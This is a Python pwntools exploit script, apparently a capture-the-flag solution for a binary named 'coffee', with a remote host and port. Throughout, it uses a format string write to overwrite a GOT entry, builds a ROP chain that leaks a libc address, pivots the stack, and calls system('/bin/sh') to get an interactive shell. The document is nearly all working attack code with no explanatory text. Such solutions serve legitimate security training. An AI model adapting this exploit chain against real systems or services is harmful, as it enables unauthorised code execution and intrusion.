#!/usr/bin/python
from pwn import *
import sys

LOCAL = True

HOST = "34.146.101.4"
PORT = 30002
PROCESS = "./coffee"


def exploit(r):
    writes = {e.got["puts"]: 0x401286}

    context.arch = "amd64"

    payload = fmtstr_payload(6, writes, write_size="short")

    POPRDI = 0x401293
    POPRBP = 0x40117d
    POPRSI15 = 0x401291
    PUTSPLT = 0x401030
    RET = 0x40101a
    LEAVE = 0x000000000040121f

    payload += p64(0xdeadbeef)                # padding

    # puts(printf.got)
    payload += p64(POPRDI)
    payload += p64(e.got["printf"])
    payload += p64(PUTSPLT)

    # scanf("%159s", 0x404880)
    payload += p64(POPRDI)
    payload += p64(0x403004)
    payload += p64(POPRSI15)
    payload += p64(0x404880)
    payload += p64(0x0)
    payload += p64(e.plt["__isoc99_scanf"])

    # stack pivot to 0x404880
    payload += p64(POPRBP)
    payload += p64(0x404880-8)
    payload += p64(LEAVE)

    r.sendline(payload)

    # read printf
    r.recvuntil(p32(0x40401800))
    LEAK = r.recvline()

    PRINTF = u64(LEAK[:-1].ljust(8, "\x00"))
    libc.address = PRINTF - libc.symbols["printf"]

    log.info("PRINTF     : %s" % hex(PRINTF))
    log.info("LIBC       : %s" % hex(libc.address))

    payload = p64(POPRDI)
    payload += p64(next(libc.search("/bin/sh")))
    payload += p64(libc.symbols["system"])

    r.sendline(payload)

    r.interactive()

    return


if __name__ == "__main__":
    e = ELF("./coffee")
    libc = ELF("./libc.so.6")

    if len(sys.argv) > 1:
        LOCAL = False
        r = remote(HOST, PORT)
    else:
        LOCAL = True
        r = process("./coffee", env={"LD_PRELOAD": "./libc.so.6"})
        print(util.proc.pidof(r))
        pause()

    exploit(r)
